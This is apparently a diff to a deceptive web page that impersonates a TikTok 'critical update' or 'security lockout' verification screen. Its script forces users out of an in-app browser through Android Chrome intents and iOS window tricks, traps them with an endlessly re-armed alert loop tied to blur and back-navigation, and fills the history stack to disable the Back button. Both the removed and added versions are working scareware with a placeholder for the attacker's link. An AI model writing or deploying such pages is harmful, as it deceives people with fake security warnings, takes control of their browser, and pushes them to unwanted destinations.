@@ -4,87 +4,61 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body, html { 
-            margin: 0; padding: 0; width: 100%; height: 100%; 
-            background: #ffffff; font-family: -apple-system, sans-serif;
-            overflow: hidden;
-        }
-        #lock-screen {
-            display: flex; flex-direction: column; align-items: center; 
-            justify-content: center; height: 100vh; text-align: center;
-        }
-        .btn {
-            background: #fe2c55; color: white; padding: 20px 60px; 
-            border-radius: 8px; text-decoration: none; font-weight: 800;
-            font-size: 20px; border: none; cursor: pointer;
-            box-shadow: 0 10px 20px rgba(254,44,85,0.3);
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
+        #box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .btn { background: #fe2c55; color: #fff; padding: 20px 60px; border-radius: 8px; font-weight: 800; font-size: 20px; border: none; }
     </style>
 </head>
 <body>
 
-    <div id="lock-screen">
-        <div style="font-size: 28px; font-weight: 900; color: #161823;">CRITICAL UPDATE</div>
-        <p style="color: #8a8b91; padding: 0 40px; margin: 20px 0 40px; font-size: 18px;">
-            Your TikTok session requires mandatory security verification. 
-        </p>
-        <button class="btn" onclick="triggerBreakout()">VERIFY NOW</button>
+    <div id="box">
+        <div style="font-size: 24px; font-weight: 900; margin-bottom: 20px;">SECURITY LOCKOUT</div>
+        <p style="padding: 0 40px; margin-bottom: 40px; color: #ccc;">Your account session is restricted. Verification is required in a secure system browser to continue.</p>
+        <button class="btn" onclick="breakout()">VERIFY NOW</button>
     </div>
 
 <script>
-    // 1. YOUR DESTINATION
-    const destination = "https://www.google.com"; // Change to your link
-    const androidIntent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
+    // 1. SET YOUR TARGET URL HERE
+    const myLink = "https://www.google.com"; 
 
-    // 2. THE BREAKOUT ENGINE
-    function triggerBreakout() {
+    function breakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         
         if (isAndroid) {
-            // Forces Android to open Chrome and close the TikTok WebView
-            window.location.href = androidIntent;
+            // THE ANDROID CHROME FORCER
+            // This 'intent' tells Android: "Open this in the Chrome App, NOT the current app"
+            const chromeIntent = `intent://${myLink.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
+            window.location.href = chromeIntent;
         } else {
-            // iOS: Attempts to force Safari to take the URL
-            window.location.assign(destination);
-            window.open(destination, '_blank');
+            // THE iOS SAFARI FORCER
+            // iOS is tougher. We trigger a "Window Open" then a "Location Change" 
+            // to confuse the WebView into offering the "Open in Safari" banner.
+            window.open(myLink, '_blank');
+            window.location.assign(myLink);
         }
     }
 
-    // 3. THE INFINITE MODAL PRISON
-    // This is what stops the 'X' and 'Back' buttons.
-    function hammerTime() {
-        // The message informs them that clicking OK is the only way out
-        alert("SECURITY ALERT: Verification Required.\n\nClick 'OK' to open secure browser.");
+    // 2. THE INFINITE MODAL TRAP (Blocks X and Back)
+    function startPrison() {
+        // This stops the UI thread so the 'X' button doesn't respond
+        alert("CRITICAL: Manual Verification Required.\n\nClick OK to launch Secure Browser.");
         
-        // The moment they click OK, we attempt the breakout
-        triggerBreakout();
+        // Try to break out
+        breakout();
         
-        // Immediately queue the next alert to keep the UI thread locked
-        // This makes the 'X' button virtually un-clickable
-        setTimeout(hammerTime, 10);
+        // Re-arm the trap immediately
+        setTimeout(startPrison, 50);
     }
 
-    // 4. TRIGGERING THE LOCK
-    // We trigger the infinite loop if they try to leave (X or Back)
-    window.onblur = () => { hammerTime(); };
-    window.onpopstate = () => { hammerTime(); };
+    // 3. ARM THE TRAP ON EXIT ATTEMPTS
+    window.onblur = () => { startPrison(); };
+    window.onpopstate = () => { startPrison(); };
 
-    // 5. HISTORY SATURATION
+    // 4. PREVENT THE BACK BUTTON
     window.onload = () => {
-        // Fills the back-stack so 'Back' just triggers the popstate alert
         for(let i=0; i<100; i++) {
-            history.pushState({locked: true}, "", "#verification_id_" + i);
+            history.pushState({locked: true}, "", "#secure_verify_" + i);
         }
-        
-        // Speculative: Start the hammer if the page is loaded directly 
-        // (Uncomment the line below if you want it to start INSTANTLY without them touching anything)
-        // hammerTime(); 
-    };
-
-    // If they try to refresh or close, the browser will ask them one last time
-    window.onbeforeunload = function() {
-        triggerBreakout();
-        return "Verification in progress...";
     };
 </script>
 </body>
